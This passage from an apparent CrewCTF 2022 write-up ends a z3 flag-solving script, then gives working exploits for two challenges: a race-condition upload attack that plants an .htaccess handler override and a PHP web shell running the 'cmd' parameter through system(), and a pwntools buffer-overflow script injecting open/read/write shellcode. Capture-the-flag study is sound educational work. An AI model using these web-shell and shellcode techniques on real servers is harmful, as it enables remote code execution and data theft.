add_eq(flag[0]^flag[35]*flag[30]==13697)
add_eq(flag[26]+flag[9]^flag[14]+flag[7]^flag[4]==76)
add_eq(flag[34]+flag[18]*flag[38]-flag[32]==9952)
add_eq(flag[7]-flag[0]+flag[36]-flag[11]==-70)
add_eq(flag[31]*flag[37]+flag[29]==3308)
add_eq(flag[25]^flag[21]*flag[38]==11859)
add_eq(flag[26]^flag[10]+flag[5]==184)
add_eq(flag[16]-flag[10]*flag[25]==-5100)
add_eq(flag[36]^flag[13]+flag[1]*flag[23]==12575)
add_eq(flag[17]^flag[29]-flag[8]+flag[18]==50)
add_eq(flag[3]-flag[32]*flag[23]==-10551)
add_eq(flag[10]^flag[31]+flag[4]^flag[11]-flag[27]==131)
add_eq(flag[35]-flag[18]*flag[9]+flag[15]-flag[8]==-3670)
add_eq(flag[0]^flag[28]*flag[7]+flag[19]==12843)
add_eq(flag[15]^flag[11]+flag[35]==158)
add_eq(flag[38]-flag[25]^flag[37]==114)
add_eq(flag[3]+flag[22]*flag[25]-flag[15]+flag[27]==2503)
add_eq(flag[17]^flag[11]-flag[16]+flag[19]*flag[8]==6831)
add_eq(flag[38]*flag[11]^flag[33]-flag[8]==14478)
add_eq(flag[9]*flag[12]^flag[2]==4533)
add_eq(flag[9]*flag[6]^flag[16]==5076)
add_eq(flag[23]-flag[22]^flag[14]+flag[10]*flag[17]==10364)
add_eq(flag[28]+flag[21]*flag[18]==7714)
add_eq(flag[0]+flag[18]-flag[5]^flag[3]-flag[9]==4)
add_eq(flag[20]+flag[21]*flag[31]==4925)
add_eq(flag[19]-flag[34]*flag[17]-flag[32]^flag[37]==-4633)
add_eq(flag[36]^flag[34]*flag[16]^flag[33]*flag[22]==1457)
add_eq(flag[34]-flag[32]*flag[24]^flag[37]==-9583)
add_eq(flag[0]+flag[9]*flag[17]-flag[2]==4558)
add_eq(flag[35]+flag[26]-flag[13]+flag[34]^flag[10]==160)
add_eq(flag[6]+flag[22]-flag[8]^flag[3]==46)
add_eq(flag[10]*flag[12]+flag[28]==10374)
add_eq(flag[15]-flag[16]^flag[24]==124)
add_eq(flag[5]^flag[23]+flag[10]-flag[14]*flag[9]==-2246)
add_eq(flag[13]^flag[6]+flag[25]*flag[19]-flag[27]==5111)
add_eq(flag[27]*flag[26]^flag[13]-flag[37]*flag[30]==-2088)
add_eq(flag[29]-flag[20]*flag[23]^flag[31]==-8756)
add_eq(flag[38]*flag[7]^flag[6]*flag[4]==1864)
add_eq(flag[1]*flag[13]^flag[20]+flag[3]==7587)
add_eq(flag[11]^flag[6]*flag[31]^flag[2]*flag[29]==12727)
add_eq(flag[26]^flag[5]+flag[31]-flag[32]==38)
add_eq(flag[37]*flag[2]+flag[3]-flag[14]==6431)
add_eq(flag[24]^flag[1]*flag[36]+flag[29]==3954)
add_eq(flag[26]*flag[14]-flag[2]==4999)
add_eq(flag[27]*flag[18]-flag[32]==3983)
add_eq(flag[6]*flag[23]+flag[29]*flag[18]+flag[10]==19148)
add_eq(flag[34]+flag[13]^flag[0]==16)
add_eq(flag[22]+flag[21]-flag[2]==45)
add_eq(flag[10]^flag[3]-flag[9]+flag[8]==229)
add_eq(flag[7]-flag[31]*flag[1]==-5702)
add_eq(flag[1]^flag[14]*flag[27]-flag[21]==2488)
add_eq(flag[31]+flag[24]^flag[0]==245)
add_eq(flag[8]-flag[27]+flag[11]-flag[33]==23)
add_eq(flag[23]*flag[32]+flag[8]^flag[3]==10631)
add_eq(flag[6]+flag[25]-flag[22]==101)
add_eq(flag[23]+flag[36]^flag[38]+flag[16]^flag[26]==58)
add_eq(flag[10]*flag[8]+flag[26]==7228)
add_eq(flag[0]+flag[2]-flag[21]==105)
add_eq(flag[16]*flag[6]+flag[35]^flag[12]+flag[33]==8786)
add_eq(flag[20]*flag[9]+flag[11]==3956)
add_eq(flag[8]^flag[31]-flag[2]*flag[13]==-6549)
add_eq(flag[35]*flag[12]+flag[19]==11599)
add_eq(flag[35]-flag[38]^flag[15]+flag[36]==-152)
add_eq(flag[3]*flag[8]-flag[19]==7750)
add_eq(flag[37]+flag[12]-flag[27]+flag[22]^flag[19]==246)
add_eq(flag[26]^flag[0]+flag[13]*flag[10]-flag[7]==7087)
add_eq(flag[0]+flag[28]*flag[18]==9219)
add_eq(flag[3]-flag[32]*flag[34]==-4634)
add_eq(flag[19]^flag[7]-flag[14]*flag[21]==-4629)
add_eq(flag[35]-flag[3]*flag[9]-flag[36]==-5624)
add_eq(flag[16]*flag[11]-flag[4]*flag[34]==3717)
add_eq(flag[27]*flag[33]+flag[14]==5559)
add_eq(flag[30]+flag[15]^flag[6]==141)
add_eq(flag[10]*flag[30]-flag[28]+flag[12]==12293)
add_eq(flag[22]+flag[10]*flag[8]^flag[20]==7259)
add_eq(flag[13]-flag[26]+flag[0]==65)
add_eq(flag[10]^flag[31]-flag[32]==-66)
add_eq(flag[26]-flag[27]^flag[12]*flag[6]==9897)
add_eq(flag[17]+flag[20]^flag[31]*flag[33]==5419)
add_eq(flag[26]-flag[38]*flag[27]^flag[36]+flag[17]==-6147)
add_eq(flag[14]*flag[9]+flag[18]^flag[17]*flag[32]==10783)
add_eq(flag[34]^flag[23]+flag[22]==144)
add_eq(flag[37]*flag[7]-flag[38]+flag[14]==6982)
add_eq(flag[19]^flag[15]-flag[27]==40)
add_eq(flag[8]^flag[12]+flag[37]-flag[22]==41)
add_eq(flag[36]*flag[2]^flag[16]==3409)
add_eq(flag[19]*flag[25]+flag[1]*flag[26]==16392)
add_eq(flag[35]^flag[33]-flag[5]==-123)
add_eq(flag[16]*flag[28]+flag[17]^flag[11]+flag[20]==9475)
add_eq(flag[34]+flag[9]*flag[29]+flag[26]-flag[0]==4610)
add_eq(flag[37]-flag[2]*flag[20]+flag[38]-flag[32]==-7989)
add_eq(flag[31]-flag[18]*flag[10]==-8589)
add_eq(flag[15]-flag[32]+flag[14]^flag[8]-flag[10]==-109)
add_eq(flag[5]^flag[37]-flag[3]+flag[33]==68)
add_eq(flag[21]*flag[10]^flag[20]+flag[11]^flag[30]==10402)
add_eq(flag[30]-flag[36]^flag[16]==5)
add_eq(flag[33]+flag[5]*flag[11]==13100)
add_eq(flag[19]-flag[11]*flag[15]==-13236)
add_eq(flag[25]-flag[18]^flag[1]+flag[26]==-202)
add_eq(flag[25]*flag[7]^flag[32]+flag[15]^flag[4]==5551)
add_eq(flag[10]+flag[28]^flag[33]-flag[23]==-224)
add_eq(flag[0]*flag[21]+flag[16]*flag[32]^flag[1]==17635)
add_eq(flag[26]-flag[27]^flag[29]*flag[24]==9356)
add_eq(flag[17]^flag[32]+flag[14]*flag[27]==2773)
add_eq(flag[10]-flag[30]^flag[22]==-55)
add_eq(flag[13]+flag[16]*flag[34]==4182)
add_eq(flag[21]-flag[36]*flag[0]-flag[2]==-3273)
add_eq(flag[33]+flag[8]*flag[12]-flag[10]==6270)
add_eq(flag[22]+flag[27]*flag[15]-flag[31]==5865)
add_eq(flag[23]^flag[29]-flag[4]*flag[3]==-14500)
add_eq(flag[3]^flag[30]*flag[18]^flag[12]==9096)
add_eq(flag[8]^flag[23]+flag[4]==171)
add_eq(flag[32]^flag[30]*flag[8]-flag[25]+flag[10]==7617)
add_eq(flag[16]-flag[38]^flag[2]==-78)
add_eq(flag[3]^flag[25]*flag[5]+flag[10]==5403)
add_eq(flag[14]*flag[16]+flag[0]==4383)
add_eq(flag[20]*flag[4]-flag[31]==9789)
add_eq(flag[26]+flag[0]^flag[11]*flag[8]==7471)
add_eq(flag[9]+flag[3]*flag[26]==11948)
add_eq(flag[21]+flag[13]*flag[26]+flag[8]*flag[5]==14087)
add_eq(flag[11]^flag[16]+flag[20]-flag[3]+flag[24]==228)
add_eq(flag[15]-flag[4]^flag[27]*flag[35]-flag[33]==-6057)
add_eq(flag[9]-flag[29]*flag[5]==-10592)
add_eq(flag[33]-flag[3]*flag[7]==-13220)
add_eq(flag[5]+flag[26]-flag[27]==161)
add_eq(flag[5]-flag[37]^flag[1]-flag[24]+flag[25]==14)
add_eq(flag[35]^flag[38]*flag[36]==4196)
add_eq(flag[3]-flag[22]+flag[10]*flag[16]+flag[34]==9189)
add_eq(flag[26]*flag[25]-flag[35]+flag[33]-flag[31]==4736)
add_eq(flag[25]-flag[37]+flag[9]-flag[35]*flag[23]==-13277)
add_eq(flag[35]+flag[19]^flag[7]+flag[26]==53)
add_eq(flag[29]-flag[19]^flag[26]*flag[25]+flag[23]==-4903)
add_eq(flag[37]*flag[2]^flag[36]==6394)
add_eq(flag[26]-flag[12]*flag[21]==-8925)
add_eq(flag[17]+flag[18]*flag[3]^flag[13]+flag[23]==9535)
add_eq(flag[17]+flag[12]-flag[1]*flag[28]^flag[7]==-12918)
add_eq(flag[0]^flag[21]*flag[28]-flag[11]+flag[29]==10842)
add_eq(flag[1]+flag[25]^flag[27]+flag[21]==48)
add_eq(flag[0]+flag[36]*flag[21]==3234)
add_eq(flag[6]*flag[13]-flag[24]*flag[20]-flag[28]==-1170)
add_eq(flag[9]^flag[37]+flag[2]-flag[5]^flag[21]==91)
add_eq(flag[8]-flag[10]+flag[6]*flag[16]-flag[7]==8582)
add_eq(flag[25]*flag[14]+flag[28]^flag[27]==2609)
add_eq(flag[27]*flag[28]^flag[38]==5835)
add_eq(flag[10]^flag[5]+flag[36]^flag[37]+flag[22]==143)
add_eq(flag[29]-flag[10]*flag[37]^flag[4]+flag[36]==-6825)
add_eq(flag[6]^flag[31]+flag[1]-flag[0]==42)
add_eq(flag[17]+flag[28]*flag[21]+flag[11]^flag[24]==11074)
add_eq(flag[24]+flag[10]*flag[8]==7227)
add_eq(flag[20]*flag[35]+flag[4]^flag[13]+flag[37]==9930)
add_eq(flag[23]^flag[5]*flag[28]^flag[25]==12734)
add_eq(flag[13]+flag[29]*flag[0]^flag[33]==9363)
add_eq(flag[19]+flag[26]^flag[35]+flag[20]^flag[5]==117)
add_eq(flag[19]-flag[26]*flag[35]-flag[16]==-12080)
add_eq(flag[31]+flag[37]-flag[3]+flag[25]^flag[13]==105)
add_eq(flag[16]^flag[24]*flag[31]^flag[32]==5004)
add_eq(flag[33]-flag[35]+flag[14]==38)
add_eq(flag[18]^flag[29]-flag[36]==110)
add_eq(flag[35]^flag[15]*flag[16]-flag[32]^flag[17]==9597)
add_eq(flag[24]^flag[38]-flag[22]*flag[4]==-6241)
add_eq(flag[30]+flag[31]-flag[36]==132)
add_eq(flag[11]^flag[4]-flag[3]+flag[26]*flag[13]==6584)
add_eq(flag[7]-flag[30]+flag[37]*flag[27]-flag[4]==3088)
add_eq(flag[37]+flag[3]-flag[30]==68)
add_eq(flag[23]+flag[10]-flag[20]+flag[15]-flag[7]==141)
add_eq(flag[12]-flag[3]*flag[31]+flag[5]*flag[29]==4666)
add_eq(flag[37]*flag[16]+flag[3]*flag[7]==18620)
add_eq(flag[38]+flag[7]-flag[17]+flag[13]==208)
add_eq(flag[38]*flag[11]-flag[26]^flag[32]+flag[36]==14530)
add_eq(flag[29]+flag[9]-flag[7]==31)
add_eq(flag[30]+flag[3]*flag[31]^flag[38]*flag[34]==4042)
add_eq(flag[3]-flag[8]^flag[9]-flag[21]+flag[4]==121)
add_eq(flag[31]^flag[3]+flag[14]^flag[16]-flag[20]==157)
add_eq(flag[2]-flag[9]*flag[37]==-2923)
add_eq(flag[1]-flag[37]^flag[8]*flag[10]-flag[23]==7001)
add_eq(flag[19]-flag[31]^flag[10]*flag[32]^flag[36]==10488)
add_eq(flag[0]^flag[38]+flag[24]-flag[30]+flag[23]==191)
add_eq(flag[9]-flag[29]^flag[0]-flag[2]^flag[5]==95)
add_eq(flag[33]-flag[23]+flag[35]==119)
add_eq(flag[2]^flag[5]+flag[25]*flag[13]==3253)
add_eq(flag[7]*flag[30]^flag[28]-flag[14]==12767)
add_eq(flag[7]^flag[15]*flag[38]==14423)
add_eq(flag[26]+flag[9]^flag[25]*flag[29]-flag[22]==4361)
add_eq(flag[31]*flag[25]-flag[38]==2323)
add_eq(flag[31]^flag[35]*flag[1]-flag[38]+flag[6]==13822)
add_eq(flag[33]+flag[35]-flag[29]+flag[4]^flag[6]==361)
add_eq(flag[26]-flag[33]^flag[6]+flag[11]-flag[7]==-108)
add_eq(flag[17]-flag[0]^flag[33]-flag[10]==-4)
add_eq(flag[26]+flag[14]^flag[35]*flag[32]==11598)
add_eq(flag[24]^flag[1]+flag[26]-flag[23]==11)
add_eq(flag[38]+flag[28]-flag[25]^flag[4]==196)
add_eq(flag[4]*flag[0]^flag[3]+flag[2]==12109)
add_eq(flag[29]*flag[33]^flag[10]*flag[8]==13260)
add_eq(flag[24]^flag[37]+flag[8]-flag[18]==82)
add_eq(flag[8]*flag[27]^flag[38]==3419)
add_eq(flag[26]*flag[4]^flag[38]==12401)
add_eq(flag[22]+flag[19]^flag[13]-flag[12]==-136)
add_eq(flag[15]^flag[5]-flag[28]+flag[34]*flag[35]==5972)
add_eq(flag[13]+flag[37]-flag[20]*flag[16]+flag[27]==-6540)
add_eq(flag[6]-flag[28]^flag[38]*flag[29]==-11883)
add_eq(flag[35]-flag[1]*flag[11]^flag[34]==-13088)
add_eq(flag[34]*flag[14]-flag[25]==2451)
add_eq(flag[19]-flag[24]+flag[38]^flag[6]==234)
add_eq(flag[32]-flag[31]+flag[35]^flag[37]==152)
add_eq(flag[33]^flag[23]-flag[15]*flag[29]-flag[34]==-10756)
add_eq(flag[7]-flag[16]^flag[6]*flag[17]^flag[31]==9911)
add_eq(flag[19]-flag[5]+flag[32]==89)
add_eq(flag[20]-flag[27]+flag[18]*flag[31]^flag[37]==4146)
add_eq(flag[9]-flag[4]^flag[37]-flag[28]==120)
add_eq(flag[0]*flag[11]-flag[37]*flag[9]+flag[23]==8570)
add_eq(flag[36]*flag[30]+flag[0]^flag[4]==3950)
add_eq(flag[28]*flag[24]-flag[35]^flag[32]==11260)
add_eq(flag[33]+flag[25]^flag[36]-flag[1]==-205)
add_eq(flag[35]-flag[7]^flag[30]==123)
add_eq(flag[24]*flag[29]^flag[16]+flag[10]==9341)
add_eq(flag[32]*flag[3]-flag[24]==11444)
add_eq(flag[27]*flag[31]^flag[2]==2636)
add_eq(flag[1]*flag[38]-flag[15]*flag[14]==8385)
add_eq(flag[28]+flag[1]*flag[25]-flag[11]*flag[0]==-5898)
add_eq(flag[30]+flag[13]^flag[35]==205)
add_eq(flag[27]-flag[21]^flag[25]+flag[28]==-138)
add_eq(flag[27]*flag[3]^flag[24]+flag[2]^flag[6]==5909)
add_eq(flag[1]*flag[10]^flag[23]==12406)
add_eq(flag[15]^flag[34]-flag[12]*flag[23]+flag[29]==-10291)
add_eq(flag[36]-flag[31]+flag[6]==86)
add_eq(flag[20]^flag[28]-flag[17]*flag[34]^flag[14]==-4576)
add_eq(flag[12]*flag[30]^flag[23]+flag[2]==10909)
add_eq(flag[4]*flag[7]^flag[0]==13747)
add_eq(flag[15]^flag[25]*flag[22]==2531)
add_eq(flag[13]-flag[24]^flag[34]==-18)
add_eq(flag[17]^flag[18]-flag[31]==66)
add_eq(flag[6]^flag[23]*flag[32]+flag[30]-flag[24]==10709)
add_eq(flag[0]+flag[4]*flag[25]-flag[24]^flag[7]==5984)
add_eq(flag[21]+flag[38]*flag[24]^flag[20]==12518)
add_eq(flag[16]+flag[20]*flag[6]-flag[2]==8303)
add_eq(flag[21]^flag[24]*flag[30]-flag[16]==11165)
add_eq(flag[28]*flag[13]+flag[15]==7639)
add_eq(flag[1]*flag[28]-flag[11]^flag[3]==12839)
add_eq(flag[28]-flag[11]*flag[19]+flag[35]*flag[29]==-455)
add_eq(flag[29]+flag[24]*flag[23]-flag[3]==10866)
add_eq(flag[25]-flag[5]^flag[29]==-97)
add_eq(flag[19]+flag[9]*flag[24]-flag[17]==4761)
add_eq(flag[12]+flag[5]*flag[1]^flag[27]-flag[20]==-12836)
add_eq(flag[30]^flag[32]*flag[38]-flag[16]^flag[28]==12041)
add_eq(flag[19]-flag[13]^flag[35]-flag[0]+flag[38]==181)
add_eq(flag[34]^flag[13]+flag[29]==144)
add_eq(flag[9]^flag[8]-flag[22]+flag[29]==94)
add_eq(flag[13]+flag[2]-flag[4]==44)
add_eq(flag[4]-flag[7]^flag[14]+flag[38]*flag[3]==14917)
add_eq(flag[35]*flag[33]^flag[29]-flag[18]==13059)
add_eq(flag[14]^flag[0]-flag[25]^flag[27]-flag[35]==-70)
add_eq(flag[6]*flag[31]-flag[21]==5209)
add_eq(flag[12]^flag[13]+flag[4]*flag[0]+flag[27]==12377)
add_eq(flag[0]+flag[9]*flag[17]-flag[35]+flag[33]==4646)
add_eq(flag[15]+flag[11]^flag[22]+flag[31]^flag[0]==226)
add_eq(flag[25]-flag[7]^flag[35]==-71)
add_eq(flag[2]^flag[31]+flag[11]-flag[6]^flag[1]==40)
add_eq(flag[23]^flag[38]-flag[19]==123)
add_eq(flag[23]^flag[16]-flag[1]*flag[24]^flag[17]==-11249)
add_eq(flag[6]-flag[36]+flag[11]^flag[16]==239)
add_eq(flag[5]-flag[4]*flag[20]^flag[32]==-9631)
add_eq(flag[4]-flag[29]*flag[32]^flag[28]==-9202)
add_eq(flag[30]-flag[14]^flag[24]-flag[18]==44)
add_eq(flag[17]+flag[38]*flag[34]^flag[3]==6203)
add_eq(flag[30]+flag[19]*flag[14]==5418)
add_eq(flag[20]^flag[6]+flag[2]==157)
add_eq(flag[24]^flag[13]-flag[14]==108)
add_eq(flag[36]-flag[30]+flag[38]==44)
add_eq(flag[38]+flag[20]^flag[2]+flag[17]*flag[34]==4697)
add_eq(flag[34]^flag[28]-flag[23]*flag[35]+flag[19]==-13075)
add_eq(flag[17]^flag[19]+flag[15]==132)
add_eq(flag[18]+flag[14]*flag[20]==4160)
add_eq(flag[12]-flag[8]*flag[5]==-7297)
add_eq(flag[21]-flag[14]*flag[23]==-5515)
add_eq(flag[34]*flag[22]+flag[32]-flag[12]==2501)
add_eq(flag[12]+flag[8]*flag[30]+flag[23]*flag[21]==18069)
add_eq(flag[9]*flag[4]+flag[7]^flag[20]+flag[14]==5891)
add_eq(flag[14]*flag[7]-flag[32]+flag[4]==5738)
add_eq(flag[2]-flag[36]*flag[18]^flag[19]==-2435)
add_eq(flag[7]*flag[34]+flag[11]==5604)
add_eq(flag[33]*flag[27]+flag[17]==5603)
add_eq(flag[18]+flag[14]^flag[36]-flag[17]==-191)
add_eq(flag[4]-flag[36]+flag[22]*flag[1]+flag[9]==5952)
add_eq(flag[4]^flag[38]-flag[34]+flag[28]*flag[5]==12887)
add_eq(flag[8]-flag[33]*flag[19]+flag[30]-flag[12]==-11147)
add_eq(flag[19]+flag[36]^flag[6]*flag[9]==4873)
add_eq(flag[22]*flag[5]^flag[32]*flag[20]-flag[12]==2977)
add_eq(flag[13]-flag[11]*flag[24]+flag[5]==-11306)
add_eq(flag[23]*flag[11]+flag[34]^flag[12]==12886)
add_eq(flag[34]-flag[18]+flag[15]*flag[23]-flag[9]==12571)
add_eq(flag[15]-flag[2]*flag[11]-flag[7]==-11713)
add_eq(flag[6]+flag[24]*flag[5]^flag[13]*flag[32]==12986)
add_eq(flag[30]*flag[11]^flag[22]-flag[33]+flag[8]==13217)
add_eq(flag[32]+flag[22]*flag[13]-flag[11]+flag[33]==3455)
add_eq(flag[30]-flag[17]+flag[33]-flag[22]==76)
add_eq(flag[15]+flag[21]^flag[34]*flag[32]==4675)
add_eq(flag[12]-flag[23]*flag[11]==-12665)
add_eq(flag[34]-flag[7]*flag[20]+flag[9]*flag[30]==-3439)
add_eq(flag[20]*flag[1]-flag[4]+flag[18]==9077)
add_eq(flag[17]+flag[19]*flag[36]==3527)
add_eq(flag[22]^flag[15]*flag[18]==9155)
add_eq(flag[6]^flag[15]*flag[12]==10949)
add_eq(flag[15]*flag[20]+flag[5]-flag[24]==9213)
add_eq(flag[6]+flag[7]*flag[15]-flag[19]==12880)
add_eq(flag[7]+flag[17]-flag[1]*flag[13]+flag[15]==-7202)
add_eq(flag[13]-flag[17]+flag[12]^flag[22]==113)
add_eq(flag[15]+flag[24]^flag[7]-flag[28]==-216)
add_eq(flag[5]^flag[17]-flag[33]==-125)
add_eq(flag[12]^flag[18]*flag[6]==8415)
add_eq(flag[5]^flag[33]+flag[22]==239)
add_eq(flag[4]^flag[8]-flag[2]*flag[30]+flag[5]==-11325)
add_eq(flag[20]*flag[34]+flag[12]==4015)
add_eq(flag[30]^flag[18]-flag[19]+flag[6]==34)
add_eq(flag[30]*flag[8]+flag[9]*flag[17]==12084)
add_eq(flag[30]-flag[20]*flag[19]^flag[6]==-8294)
add_eq(flag[5]-flag[34]*flag[12]==-4543)
add_eq(flag[22]-flag[2]^flag[21]-flag[7]==33)
add_eq(flag[18]*flag[34]-flag[8]+flag[21]*flag[6]==13734)
add_eq(flag[2]-flag[34]^flag[21]+flag[8]==149)
add_eq(flag[6]-flag[36]*flag[12]==-3031)
add_eq(flag[15]*flag[30]-flag[12]==13015)
add_eq(flag[17]+flag[4]*flag[12]==11780)
add_eq(flag[30]-flag[18]*flag[1]==-9006)
add_eq(flag[36]*flag[12]-flag[1]==3021)
add_eq(flag[15]^flag[18]-flag[1]^flag[5]*flag[8]==-7347)
add_eq(flag[18]^flag[9]-flag[36]==95)
add_eq(flag[18]+flag[22]*flag[4]^flag[36]==6384)
add_eq(flag[33]^flag[15]+flag[7]-flag[34]+flag[8]==152)
add_eq(flag[1]*flag[33]+flag[22]*flag[17]==17157)
add_eq(flag[17]^flag[1]-flag[2]==82)
add_eq(flag[17]^flag[33]-flag[18]==67)
add_eq(flag[1]*flag[15]-flag[17]==13015)
add_eq(flag[34]-flag[2]^flag[22]+flag[18]==-177)
add_eq(flag[1]+flag[2]*flag[33]==11022)
add_eq(flag[2]==101)

i = 0
start_time = time.time()
if s.check() == sat: # https://stackoverflow.com/questions/13395391/z3-finding-all-satisfying-models
  founded = prepare_founded_values() # return founded values as array
  print ''.join( chr(j) for j in founded ) # print flag as string
  iterate_all() # prepare to next iteration, anticollision
  i += 1
print('--- %.2f second(s) && %d answer(s) ---' % ((time.time() - start_time), i) )
```
Running the script should output the flag.

```
$ python2 check.py                                                                                                                                                                                                                   
crew{phpB0lt_B3sT_PhP_3nc0d3r_r3al1y!?}
--- 0.02 second(s) && 1 answer(s) ---
```


# Uploadz (Web)

	I think this site safe from upload file, prove me wrong please.

Uploadz was a decent web challenge, with a source code provided with it, meaning guessing/bruteforcing aren't part of the challenge. 
```php 
<?php
 function create_temp_file($temp,$name){
    $file_temp = "storage/app/temp/".$name;
    copy($temp,$file_temp);
    
    return $file_temp;
  }
  function gen_uuid($length=6) {
    $keys = array_merge(range('a', 'z'), range('A', 'Z'));
    for($i=0; $i < $length; $i++) {
        $key .= $keys[array_rand($keys)];
        
    }

    return $key;
}
  function move_upload($source,$des){
    $name = gen_uuid();
    $des = "storage/app/uploads/".$name.$des;
    copy($source,$des);
    sleep(1);// for loadblance and anti brute
    unlink($source);
    return $des;
  }
  if (isset($_FILES['uploadedFile']))
  {
    // get details of the uploaded file
    $fileTmpPath = $_FILES['uploadedFile']['tmp_name'];
    $fileName = basename($_FILES['uploadedFile']['name']);
    $fileNameCmps = explode(".", $fileName);
    $fileExtension = strtolower(end($fileNameCmps));
    


   
    $dest_path = $uploadFileDir . $newFileName;
    $file_temp = create_temp_file($fileTmpPath, $fileName);
    echo "your file in ".move_upload($file_temp,$fileName);
    
  }
  if(isset($_GET["clear_cache"])){
    system("rm -r storage/app/uploads/*");
  }
?>
<form action="/" method="post" enctype="multipart/form-data">
Select image to upload: <input type="file" name="uploadedFile" id="fileToUpload"> 
<input type="submit" value="Upload Image" name="submit"> </form>
```

A simple static analysis against the code shows that there's room for a race condition, since our file is being uploaded as is on the temp folder, it then takes one second for us to access the file, it's being deleted using **unlink** afterwards.

To tackle this, we obviously need a script, then its all a matter of planning a successful attack to achieve an RCE. One problem I've had was that PHP wasn't executable, so I decided to a upload two files:
1- an .htaccess file that allows as to execute php code with another exension (jpg).
2- upload a JPG file that has a php code (a one liner cmd in this case).

```python
import requests
import re
import urllib3
import threading
import time
import sys

urllib3.disable_warnings()
file = ".htaccess"
file2 = "test.jpg"
path = "storage/app/temp/"
files = {
	    'uploadedFile': (file, "AddType application/x-httpd-php .jpg", 'text/plain')
}
files2 = {
	    'uploadedFile': (file2, """<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>""", 'text/plain')
}
values = {'submit': 'Upload Image'}
url = "https://uploadz-web.crewctf-2022.crewc.tf/"

def performReqs(uploadedFile):
	r = requests.post(url, files=uploadedFile,proxies={"https":"http://127.0.0.1:1337"},verify=False,data=values)
	filename = re.search("your file in (.*)<",r.text)


cmd = sys.argv[1]


t1 = threading.Thread(target=performReqs, args=(files,))

t2 = threading.Thread(target=performReqs, args=(files2,))

t2.start()
t1.start()

r2 = requests.get(url+path+"test.jpg?cmd={}".format(cmd), verify=False,proxies={"https":"http://127.0.0.1:1337"})
print(r2.text)
```

Running the script should provide the flag.

```
$ python3 slv.py "cat /flag.txt"
<pre>crewctf{upload_rce_via_race}</pre>
```

# Wiznu (PWN)


Winzu was an easy binary exploitation challenge, however, there were limitations to use certain functions using **seccomp**, NX is disabled, so we can inject shellcode.

```C
int init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  undefined8 uVar2;
  
  uVar2 = seccomp_init(0);
  seccomp_rule_add(uVar2,0x7fff0000,2,0);
  seccomp_rule_add(uVar2,0x7fff0000,0,0);
  seccomp_rule_add(uVar2,0x7fff0000,1,0);
  iVar1 = seccomp_load(uVar2);
  return iVar1;
}
```
I validated using seccomp-tools.
```
└─# seccomp-tools dump ./chall1                                                                                                                                                                                                       130 ⨯
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0008
 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
```

Finally, I came up with a script that uses a custom shellcode to read the flag.

```python 
from pwn import *

binary = context.binary = ELF('./chall1')

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
def find_ip(payload):
    p = process(exe)
    p.sendline(payload)
 # Cyclic pattern
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './chall1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(500))
context.arch = 'amd64'
shellcode = asm(
    shellcraft.pushstr( "/home/ctf/flag" ) +
    shellcraft.open( 'rsp' , 0 , 0 ) +
    shellcraft.read( 'rax' , 'rsp' , 0x100 ) +
    shellcraft.write( 1 , 'rsp' , 0x100 )
)
# Start program
#io = start()
io = remote("wiznu.crewctf-2022.crewc.tf",1337)
io.recvuntil('Special Gift for Special Person : ')
_ = io.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))
# Pad shellcode with NOPs until we get to return address
padding = b'\x90' * (offset - len(shellcode))

# Build the payload
payload = flat([
    shellcode,
    padding,
    stack
])
io.sendline(payload)
io.interactive()
```

Running the script outputs the contents of /home/ctf/flag.
```bash
> [DEBUG] Received 0x100 bytes:
    00000000  63 72 65 77  7b 4f 52 57  5f 63 6f 6d  65 5f 74 6f  │crew│{ORW│_com│e_to│
    00000010  5f 74 68 65  5f 72 65 73  63 75 65 5f  73 74 34 72  │_the│_res│cue_│st4r│
    00000020  6e 5f 68 33  72 33 21 7d  30 0a 81 ed  df 55 00 00  │n_h3│r3!}│0···│·U··│
    00000030  b0 0a 81 ed  df 55 00 00  15 4e b7 59  0e 2d 8f db  │····│·U··│·N·Y│·-··│
    00000040  40 08 81 ed  df 55 00 00  60 fe 21 0c  fe 7f 00 00  │@···│·U··│`·!·│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000060  15 4e b7 a2  4d 35 73 24  15 4e 79 39  48 05 a4 25  │·N··│M5s$│·Ny9│H··%│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000080  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000090  68 fe 21 0c  fe 7f 00 00  78 fe 21 0c  fe 7f 00 00  │h·!·│····│x·!·│····│
    000000a0  90 61 45 94  15 7f 00 00  00 00 00 00  00 00 00 00  │·aE·│····│····│····│
